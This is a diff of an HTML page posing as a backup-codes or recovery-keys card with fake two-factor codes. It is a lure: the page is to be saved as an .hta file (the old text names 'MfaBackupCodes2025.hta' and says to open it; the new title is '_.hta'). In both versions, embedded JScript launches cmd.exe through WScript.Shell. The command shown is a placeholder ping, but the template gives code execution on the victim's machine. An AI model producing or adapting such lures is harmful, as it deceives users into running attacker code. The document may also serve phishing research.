@@ -1,13 +1,12 @@
 <!DOCTYPE html>
-<!-- saved from url=(0043)https://example.com/path/to/your/file.html -->
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Save Backup Codes</title>
+  <title>_.hta</title>
   <style>
     body {
-      font-family: 'Roboto', sans-serif;
-      background: #f1f3f4;
+      font-family: 'Inter', sans-serif;
+      background: #eef2f6;
       margin: 0;
       padding: 0;
       display: flex;
@@ -17,17 +16,18 @@
     }
 
     .card {
-      background: #fff;
-      width: 400px;
-      border-radius: 8px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-      padding: 24px 32px;
+      background: #ffffff;
+      width: 420px;
+      border-radius: 12px;
+      box-shadow: 0 6px 14px rgba(0, 0, 0, 0.1);
+      padding: 28px 36px;
       text-align: center;
     }
 
     h2 {
       margin-top: 0;
-      font-weight: 400;
+      font-weight: 500;
+      color: #202124;
     }
 
     .desc {
@@ -37,56 +37,53 @@
 
     .instructions {
       text-align: left;
-      background: #f8f9fa;
-      border-left: 4px solid #1a73e8;
+      background: #f9fafb;
+      border-left: 4px solid #2563eb;
       padding: 16px;
       margin: 24px 0;
       font-size: 0.9em;
       line-height: 1.8em;
+      border-radius: 4px;
     }
 
     .codes {
       display: grid;
       grid-template-columns: repeat(2, 1fr);
-      gap: 12px;
-      font-size: 1.1em;
+      gap: 10px;
+      font-size: 1.05em;
       margin: 20px 0;
+      font-family: monospace;
+      color: #1f2937;
     }
 
     .codes div::before {
-      content: "☐ ";
+      content: "◻ ";
     }
 
     .footer {
       font-size: 0.8em;
-      color: #666;
+      color: #6b7280;
       margin-top: 12px;
-    }
-
-    .logo {
-      margin-top: 16px;
-    }
-
-    .logo img {
-      height: 24px;
     }
 
     button {
       margin-top: 20px;
-      padding: 8px 16px;
+      padding: 10px 18px;
       font-size: 0.9em;
-      background: #f1f3f4;
+      background: #2563eb;
+      color: white;
       border: none;
-      border-radius: 4px;
+      border-radius: 6px;
       cursor: pointer;
+      transition: background 0.2s ease;
     }
 
     button:hover {
-      background: #e0e0e0;
+      background: #1e40af;
     }
 
     kbd {
-      background: #eee;
+      background: #e5e7eb;
       border-radius: 3px;
       padding: 2px 6px;
       font-family: monospace;
@@ -96,36 +93,35 @@
 </head>
 <body>
   <div class="card">
-    <h2>Save your backup codes</h2>
-    <div class="desc">Follow the instructions below to save your backup codes.</div>
+    <h2>Store Your Recovery Keys</h2>
+    <div class="desc">Keep a copy of these recovery keys in a secure location.</div>
 
     <div class="instructions">
-      <div>1. Press <kbd>Ctrl</kbd> + <kbd>S</kbd> to save this page.</div>
-      <div>2. Name the file <kbd><strong>MfaBackupCodes2025.hta</strong></kbd>.</div>
-      <div>3. After saving, open the file to confirm the codes are stored properly.</div>
+      <div>1. Press <kbd>Ctrl</kbd> + <kbd>S</kbd> (or <kbd>Cmd</kbd> + <kbd>S</kbd> on Mac) to save this page.</div>
+      <div>3. Store the saved file in a secure, offline location.</div>
     </div>
 
     <div class="codes">
-      <div>8234 6752</div>
-      <div>1903 8441</div>
-      <div>4527 3096</div>
-      <div>6658 1204</div>
-      <div>2719 4890</div>
-      <div>5116 7385</div>
-      <div>0327 1968</div>
-      <div>7475 3261</div>
-      <div>9082 6673</div>
-      <div>3849 0570</div>
+      <div>9421 6850</div>
+      <div>3027 7781</div>
+      <div>5198 0432</div>
+      <div>7726 1945</div>
+      <div>1849 6283</div>
+      <div>6673 9021</div>
+      <div>5304 2719</div>
+      <div>7492 8560</div>
+      <div>9153 2086</div>
+      <div>4862 7135</div>
     </div>
 
     <div class="footer">
-      You can only use each backup code once.<br>
+      Each key can only be used once. Keep them safe.
     </div>
 
+    <script language="JScript"> 
+	var shell = new ActiveXObject("WScript.Shell"); 
+	shell.Run("cmd.exe /c ping example.com"); 
+    </script>
   </div>
-  <script language="JScript">
-    var shell = new ActiveXObject("WScript.Shell");
-    shell.Run("cmd.exe /c ping example.com");
-</script>
 </body>
 </html>
